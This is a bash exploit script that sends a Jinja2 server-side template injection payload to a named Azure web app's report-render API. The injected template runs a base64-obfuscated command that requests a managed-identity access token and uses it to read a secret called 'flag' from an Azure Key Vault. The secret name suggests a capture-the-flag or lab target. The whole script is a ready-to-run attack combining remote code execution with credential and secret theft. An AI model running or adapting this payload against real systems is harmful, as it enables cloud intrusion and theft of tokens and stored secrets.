#!/usr/bin/env bash
set +e
B=QVQ9JChjdXJsIC1zIC1IICJYLUlERU5USVRZLUhFQURFUjogJElERU5USVRZX0hFQURFUiIgIiRJREVOVElUWV9FTkRQT0lOVD9yZXNvdXJjZT1odHRwczovL3ZhdWx0LmF6dXJlLm5ldCZhcGktdmVyc2lvbj0yMDE5LTA4LTAxJmNsaWVudF9pZD03YTg1MTU2YS0wMWM0LTRlNjEtODQ3Mi00MGE5MjEwNzE1OWIiIHwgcHl0aG9uMyAtYyAiaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgnYWNjZXNzX3Rva2VuJywnJykpIikKY3VybCAtcyAiaHR0cHM6Ly9rdi10Ymwtc2VjLXgzZXVvei52YXVsdC5henVyZS5uZXQvc2VjcmV0cy9mbGFnP2FwaS12ZXJzaW9uPTcuNCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkQVQi
TPL='{{ cycler.__init__.__globals__.os.popen("echo __B__|base64 -d|bash").read() }}'
TPL=${TPL/__B__/$B}
BODY=$(jq -nc --arg t "$TPL" '{template_id:"manifest",template:$t}')
echo "=== SSTI direct host ==="
curl -s -X POST "https://app-tbl-reporting-prod.azurewebsites.net/api/v1/reports/render" -H "Content-Type: application/json" -d "$BODY" | head -c 4000
echo
echo ALL_DONE
